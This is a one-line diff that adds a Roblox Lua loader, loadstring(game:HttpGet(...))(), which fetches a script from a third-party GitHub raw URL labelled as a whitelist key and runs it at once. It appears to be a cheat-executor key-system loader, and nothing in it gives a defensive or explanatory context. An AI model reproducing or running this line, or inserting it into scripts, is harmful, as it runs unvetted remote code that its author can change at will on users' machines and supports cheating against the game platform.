@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/apkabc12345/Whitelist/main/Key'),true))()
